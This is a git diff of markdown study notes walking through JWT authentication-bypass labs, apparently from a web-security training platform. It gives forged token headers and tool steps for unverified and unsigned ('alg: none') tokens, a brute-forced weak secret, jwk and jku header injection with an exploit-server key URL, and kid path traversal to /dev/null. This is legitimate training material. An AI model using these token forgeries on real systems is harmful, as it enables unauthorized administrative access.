@@ -5119,7 +5119,7 @@ Response: Communication timed out. (chunked size is 5)
 - Enforce strict algorithm policies.
 - 
 ### JWT Attacks Lab
-- JWT authentication bypass via unverified signature
+- JWT authentication bypass via **unverified signature**
   - This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives. Modify your session token to gain access to the admin panel
   - change `sub` from "wiener" to "administrator"
     ```
@@ -5133,7 +5133,7 @@ Response: Communication timed out. (chunked size is 5)
     "sub": "administrator"
     } 
     ```
-- JWT authentication bypass via flawed signature verification
+- JWT authentication bypass via **flawed signature verification**
   - This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs. Modify your session token to gain access to the admin panel
   - change `sub` from "wiener" to "administrator" + change `alg` to "none" + remove the signature from the JWT
     ```
@@ -5151,7 +5151,7 @@ Response: Communication timed out. (chunked size is 5)
       "sub": "administrator"
     }
     ```
-- JWT authentication bypass via weak signing key
+- JWT authentication bypass via **weak signing key**
   - This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets. To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin
   - Use "JWT Editor" extention
   - Copy the JWT and brute-force the secret by hashcat > weak secret is "secret1"
@@ -5166,10 +5166,78 @@ Response: Communication timed out. (chunked size is 5)
     }
     ```
   - OR Use "JSON Web Token" extension
-  - select "recalculate signature" > input secret key "secret1" > send request
-- ddd
-- ddd
-- ddd
+  - select `recalculate signature` > input secret key "secret1" > send request
+- JWT authentication bypass via **jwk header injection**
+  - This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source. modify and sign a JWT that gives you access to the admin panel
+  - JWS header
+    GET /admin/delete?username=carlos
+    ```
+    {
+    "kid": "5fdc3825-fc3b-4a1b-8980-e7f08ef5dda5",
+    "typ": "JWT",
+    "alg": "RS256",
+    "jwk": {
+        "kty": "RSA",
+        "e": "AQAB",
+        "kid": "5fdc3825-fc3b-4a1b-8980-e7f08ef5dda5",
+        "n": "uoFkITPVm0qcafPSODtUTZJQ11UNSllOOFe5T5PnFfFj_CBV2AvlK-VsTOY_p_j8gjP34_Z6EiQANZZM4wIaUZ4mjXvl7eiyxpiC-EVGWK2YtwbvX9Z5ra0h7PcuJSYIJFVXgj9hOz1Mdwy-1Cls1XIF6MmatKQR6NGfGCAuzo4v1jIS4uCdAQcGZIe8vlLqn-uBgNlmCVvnT8G- 
+         ejMasxdTdJtfHI5mVlRNup7rRaBpU8mG0Y_b63C09X7S7vCExVdvFSvV9VrwskBc6UbHVlHepce9ZgSBaG7kf74PxBWRLFk2rf6GqTdMwTLArnhFkELyZNqdnbnBo-oq2MU1QQ"
+         }
+    }
+    ```
+  - Go to "JWT Editor Keys" > `New RSA key` > click "Generate" > click "OK" to save a key
+  - Go back to "JSON Web Token" tab in repeater > clikc `attack` > select `Embedded JWK` > select your newly generated RSA key
+  - In the payload, change the value of the sub "claim" to "administrator"
+- JWT authentication bypass via **jku header injection**
+  - This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key. To solve the lab, forge a JWT that gives you access to the admin panel at /admin
+  - Original JWT
+    ```
+    Header
+    {
+      "kid": "4a163ce5-dfa9-457d-a94a-277143ef61b6",
+      "alg": "RS256"
+    }
+    ```
+  - Go to "JWT Editor Keys" > `New RSA key` > click "Generate" > click "OK" to save a key
+  - Exploit server Body
+    ```
+    {
+    "keys": [
+
+     ]
+    }
+    ```
+  - Go to "JWT Editor Keys" > Right-click key > `Copy Public Key as JWK` > paste to exploit server body
+    ```
+    {
+    "keys": [
+          {
+    "kty": "RSA",
+    "e": "AQAB",
+    "kid": "db1710c3-11d2-473c-9caf-7144e1a19218",
+    "n": "n-5XTprTQrYbsb7PCGyPSGQtX1L_J2MmdFx6zjMFvv6mlhnmAZPcywDWrc3euiLbjgYYBeSSRJjrsQYUAOKlfOE6akFvfFkeQXNLWe5yesyG7FFWdiDO-tM0PGDYJQBTfN5oAeQet3zREhKTouapHIt4an0MPt3HxspYvw-QzbbbhKcwZdEvtpD_UZgrbAQg8UO4BkbXAjLVmggr-4yDobMEz9FiSlFObTIPlTjSw9iNFiFMw40CbuP5HGiNY0PwiZXo-5W0eZdevwWpVlHGb6YtW50YOkzbsg7dGf5n5d8PVA5XsMs1DZ9aQIU0RUwv4q1xZK_Uipn_GhsUZ_NrvQ"
+     }
+    ]
+    }
+    ```
+  - Modify and sign the JWT > repalce kid with the exploited kid value > add `jku` parameter in header > put exploit url  
+    ```
+    "kid": "db1710c3-11d2-473c-9caf-7144e1a19218",
+    "alg": "RS256",
+    "jku": "https://exploit-0a47006d03ed772682c9796e0127007f.exploit-server.net/exploit"
+    ```
+  - click `Sign` > select the RSA key
+- JWT authentication bypass via kid header **path traversal**
+  -  This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem. forge a JWT that gives you access to the admin panel
+  -  Go to "JWT Editor Keys" > `New Symmetric Key` > click "Generate" > Replace the `k` property to null value `AA==` > click "OK" to save a key
+  -  Modify and sign the JWT > change the `kid` value to `../../../../../../../dev/null`
+     ```
+     Header
+     {
+      "kid": "../../../dev/null",
+       "alg": "HS256"
+     }
+     ``` 
 - dd
 - dd
 
